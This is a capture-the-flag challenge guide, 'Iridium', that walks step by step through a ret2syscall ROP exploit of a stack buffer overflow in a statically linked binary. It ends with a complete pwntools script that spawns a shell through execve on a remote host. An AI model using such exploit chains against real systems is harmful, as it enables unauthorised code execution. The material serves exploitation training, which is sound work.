# Challenge Name
Iridium

## Learning Objective
Use ROP to perform syscall within the binary.

## Description 
Top-notch quality

## Difficulty:
Hard

## Guide
From the source code, 
1. `iridium` has size of 100 bytes
2. `read(0, iridium, 0x100);` - this reads `0x100` or **256** bytes into buffer. (more than `iridium`). Thus excess bytes allows us to do buffer overflow.

We do not have any functions to overflow into, nor is there any shell written in code.

But we notice that file is **statically linked**.

```sh
$> file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, ...
```

### Libraries
Library contains pre-written code that helps to perform functions. There are 2 types of libraries.

1. Dynamic libraries

These are only used when the binary is executed, and are separate files from the binary. These must be installed in the system.

2. Static libraries

Library codes are stored within the binary when compiled. Hence, the binary can be executed without external files.

In our case, since we do not have an external library to call our functions, we can instead perform **Linux syscalls** ourselves.

### Linux syscall table
With this information, we can do something called **ret2syscall**. This requires the use of the linux syscall table. [Here.](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)

Typically, you would want to perform `execve` syscall to run a shell (`execve(/bin/sh)`). So our ROP chain has to be setup like this:

```sh
rax: 0x3b or 59 (dec)
rdi: ptr location of `/bin/sh`
rdx: 0
rsi: 0
syscall
```

### Plan
1. Find padding needed to overwrite return address
2. Find addresses of gadgets needed
3. Find writable location for `/bin/sh`
4. move shell into writable location
5. run syscall

### Step 1 
To find the offset needed:
1. use `cyclic 200` in pwndbg (this generates the de bruijin sequence)
2. Enter `run` to execute the program
3. you should see that the `RSP` pointer contains `paaaaaaa` and beyond. We just need the first 8 bytes because that is where the return address is.

```shell
pwndbg> cyclic -l paaaaaaa
Finding cyclic pattern of 8 bytes: b'paaaaaaa' (hex: 0x7061616161616161)
Found at offset 120
```


### Step 2
Let's find the addresses of the gadgets we need.

```sh
$> ROPgadget --binary chall | grep -E ": pop (rdi|rsi|rdx|rax) ; ret" | grep -v "retf"
0x00000000004005af : pop rax ; ret
0x00000000004006a6 : pop rdi ; ret
0x000000000044b446 : pop rdx ; ret
0x0000000000410003 : pop rsi ; ret
```

```sh
$> ROPgadget --binary chall | grep ": syscall"                                        
0x000000000040127c : syscall
```

### Step 3
We need to find a writable location of the binary in memory. That is where we will put the shell command (also because we cannot run shellcode directly due to NX protection).

Run the following in pwndbg after running the program:

```sh
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x4b6000 r-xp    b6000      0 <YOUR_CHALL_DIR>
          0x6b6000           0x6bc000 rw-p     6000  b6000 <YOUR_CHALL_DIR>
```

As you can see, from `0x6b6000` to `0x6bc000`, this portion of the memory is writable. We will use this.

For this to work, we need to use a pointer gadget to move the `/bin/sh` into writable memory. Let's use one that has registers that we will be using.

(P.S. you can use other ptr gadgets as well, as long as it does not disrupt program flow and does what we need).

```sh
$> ROPgadget --binary chall | grep ": mov qword ptr \[rsi\], rax ; ret"
0x000000000047f3c1 : mov qword ptr [rsi], rax ; ret
```

FYI, `QWORD` just means 64-bit unsigned int. But more importantly, we need the pointer instruction.

### Step 4
Let's move the shell into the writable location. Since we are moving value `rax` into `rsi` pointer, we need the ROP chain to look like this:

```sh
rax: /bin/sh\x00 (need the null byte)
rsi: writable location (0x6b6000)
move rax to rsi ptr gadget
```

in the solve script it will look like this:

```py
# address to move /bin/sh into writable memory
vmmap = 0x6b6000 # found from vmmap
movptr = 0x47f3c1 # mov qword ptr [rsi], rax ; ret

payload = b'A' * 120

# ROP chain to move /bin/sh
payload += p64(pop_rax) +  b'/bin/sh\x00'
payload += p64(pop_rsi) + p64(vmmap)
payload += p64(movptr)
```

### Step 5
Now that we have the shell written in memory, we can perform the syscall. Refer to this again.

```sh
rax: 0x3b or 59 (dec)
rdi: ptr location of `/bin/sh`
rdx: 0
rsi: 0
syscall
```

Let's setup our ROP chain

```py
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdi) + p64(vmmap)
payload += p64(pop_rdx) + p64(0) 
payload += p64(pop_rsi) + p64(0)
```

### Final script
```py
from pwn import *

p = remote("IP", PORT)

# Gadgets
pop_rax = 0x4005af # pop rax ; ret
pop_rdi = 0x4006a6 # pop rdi ; ret
pop_rsi = 0x410003 # pop rsi ; ret
pop_rdx = 0x44b446 # pop rdx ; ret
syscall = 0x40127c # syscall


# address to move /bin/sh into writable memory
vmmap = 0x6b6000 # found from vmmap
movptr = 0x47f3c1 # mov qword ptr [rsi], rax ; ret

payload = b'A' * 120

# ROP chain to move /bin/sh
payload += p64(pop_rax) +  b'/bin/sh\x00'
payload += p64(pop_rsi) + p64(vmmap)
payload += p64(movptr)


# ROP (execve syscall)
# rax : 59 (0x3b)
# rdi : ptr to /bin/sh
# rdx : 0 
# rsi : 0

payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdi) + p64(vmmap)
payload += p64(pop_rdx) + p64(0) 
payload += p64(pop_rsi) + p64(0)

# syscall
payload += p64(syscall)

p.sendline(payload)
p.interactive()
```

## Solution
Refer to solve.py

## Hints
1. look up linux syscall tables


## Attached Files
- chall.c
- chall

## Resources
- https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/rop-syscall-execv/index.html
- https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md

## Flag
TBD